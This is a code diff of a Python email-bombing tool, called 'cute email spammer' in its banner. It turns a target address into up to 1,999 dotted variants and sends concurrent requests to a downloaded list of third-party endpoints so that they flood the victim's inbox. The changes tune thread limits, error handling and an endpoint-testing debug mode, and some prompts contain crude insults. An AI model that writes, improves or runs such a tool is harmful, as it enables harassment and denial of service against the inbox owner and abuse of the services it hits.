@@ -2,23 +2,25 @@ import asyncio, aiohttp, time, re, random, string, itertools, os, json
 from urllib.parse import urlencode
 
 # CONFIG ^_^
-size = 500 # threads per iteration
-cap = None  # thread limit / set to None for unlimited (i do NOT recommend higher than 1000)
+size = 300 # threads per iteration
+cap = 500  # thread limit / set to None for unlimited (i do NOT recommend higher than 1000)
 
 # skidded from chatgpt lololol!!
 def generate_email_variants(email):
     username, domain = email.split("@")
     variants = []
 
+    funnylimit = 2000 - 1 # -1 cuz i felt like it
+
     for i in range(1, len(username)):
-        if len(variants) >= 4999:
+        if len(variants) >= funnylimit:
             break
         for combo in itertools.combinations(range(1, len(username)), i):
-            if len(variants) >= 4999:
+            if len(variants) >= funnylimit:
                 break
             variant = username
             for index in reversed(combo):
-                if len(variants) >= 4999:
+                if len(variants) >= funnylimit:
                     break
                 variant = variant[:index] + '.' + variant[index:]
             variants.append(variant)
@@ -29,7 +31,7 @@ def generate_email_variants(email):
     return results
 
 
-# skidded from chelpus XD!!!!
+# skidded from a weird guy named chelpus 
 def generate_username(length: int = 5):
     min_lc = ord('a')
     len_lc = 26
@@ -107,7 +109,6 @@ async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None
             evaluation = "FAILURE" if status >= 400 else "SUCCESS"
             resp = await resp.text()
             resp = resp.strip().replace("\n", "").replace("\r", "").replace("\t", "")[:1000]
-            #status_codes.append(f"{name or 'Unknown'} -- {method} -- {status} -- {evaluation}\nURL: {url}\nRESPONSE: {resp}")
             if status_codes.get(name) is None:
                 status_codes[name] = {
                     "method": method,
@@ -116,7 +117,7 @@ async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None
                     "url": url,
                     "resp": resp
                 }
-    except Exception:
+    except (Exception, asyncio.TimeoutError):
         pass
     update_progress()
 
@@ -128,10 +129,10 @@ async def main():
             with open("functions.json", "w") as file:
                 json.dump(functions, file, indent=2)
         except Exception:
-            print("no data found, downloading...")
+            print("error no data found downloading")
             async with session.get("https://raw.githubusercontent.com/Inkthirsty/cute-email-spammer/main/functions.json") as resp:
                 functions = await resp.json()
-                print("beep boop data downloaded")
+                print("beep boop data downloaded TEMPORARILY")
         # https://patorjk.com/software/taag/#p=display&h=1&v=1&f=Bloody&t=CUTE%20EMAIL%20SPAMMER
         print("""
         ▄████▄   █    ██ ▄▄▄█████▓▓█████    ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓         ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
@@ -157,11 +158,10 @@ async def main():
             email = input("type cute email address here: ").strip().lower()
             if validate_email(email):
                 break
-            print("invalid email fuck you!!!!")
+            print("invalid email go fuck yourself")
 
         variants = generate_email_variants(email)
         threads = None
-        print("(i do NOT recommend more than 1000 threads)")
         while True:
             try:
                 limit = clamp(len(variants), 1, cap or float("inf"))
@@ -177,17 +177,18 @@ async def main():
         total = len(functions) * len(variants)
         divide()
         print("📌 useless session info")
+        global debug
+        debug = threads == 1
         info = {
             "THREADS": threads,
             "EMAIL": email,
             "PASSWORD": password,
-            "DEBUG MODE": threads == 1,
+            "DEBUG MODE": debug,
         }
         print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
         divide()
-        debug = threads == 1
         if debug:
-            testlast = input("debug mode is active, type Y to only test the last function ").strip().lower() == "y"
+            testlast = input("⚠️ debug mode is active, type Y to only test the last function ").strip().lower() == "y"
             if testlast:
                 total = 1
                 functions = dict([next(reversed(functions.items()))])
@@ -196,7 +197,8 @@ async def main():
             test_tasks = [asyncio.create_task(fetch(session, email, values, name)) for name, values in functions.items()]
             total = len(test_tasks)
             for j in range(0, len(test_tasks), size):
-                await asyncio.gather(*test_tasks[j:j+size])
+                try: await asyncio.gather(*test_tasks[j:j+size])
+                except Exception: pass
                 await asyncio.sleep(1)
             working = [k for k, v in status_codes.items() if v.get("status") < 400]
             print(f"{len(working)} of {len(test_tasks)} are working")
@@ -205,20 +207,24 @@ async def main():
             print(f"{len(test_tasks):,} endpoints have been tested -- {round((len(functions)/len(test_tasks))*100, 1):.1f}% success rate")
             total = len(functions) * len(variants)
             progress = 0
-        print(f"😼 sending some cute emails :3")
-        print("🔋 initializing...", end="\r")
+        print("🧵 initializing threads...")
         start = time.time()
         tasks = [asyncio.create_task(fetch(session, sub, values, name)) for sub in variants for name, values in functions.items()]
+        print("sending some cute emails :3")
         for j in range(0, len(tasks), size):
-            await asyncio.gather(*tasks[j:j+size])
+            try: await asyncio.gather(*tasks[j:j+size])
+            except Exception: pass
             await asyncio.sleep(1)
-    if debug:
-        with open("results.txt", "w", encoding="utf-8") as file:
-            file.write("\n\n".join([(f"{name or 'Unknown'} -- {values['method']} -- {values['status']} -- {values['evaluation']}\nURL: {values['url']}\nRESPONSE: {values['resp']}") for name, values in status_codes.items()]))
-    print(f"🤣 attempted to send {total:,} emails in {round(time.time() - start, 3):.3f} seconds")
-    print("😤 keep in mind that some emails can be delayed or never arrive")
-    print("👋 have a nice day ^_^")
-    await asyncio.sleep(10)  # intentional delay before the program commits suicide
+        if debug:
+            with open("results.txt", "w", encoding="utf-8") as file:
+                file.write("\n\n".join([(f"{name or 'Unknown'} -- {values['method']} -- {values['status']} -- {values['evaluation']}\nURL: {values['url']}\nRESPONSE: {values['resp']}") for name, values in status_codes.items()]))
+        print(f"🤣 attempted to send {total:,} emails in {round(time.time() - start, 3):.3f} seconds")
+        print("keep in mind that some emails can be delayed or never arrive")
+        async with session.get("https://raw.githack.com/Inkthirsty/cute-email-spammer/main/adjectives.json") as resp:
+            words = ", ".join(random.sample(await resp.json(), k=5))
+        prefix = "an" if words[0] in "aeiou" else "a"
+        print(f"i hope you have {prefix} {words} day ^_^")
+        await asyncio.sleep(10)  # intentional delay before the program commits suicide
 
 if __name__ == "__main__":
     try:
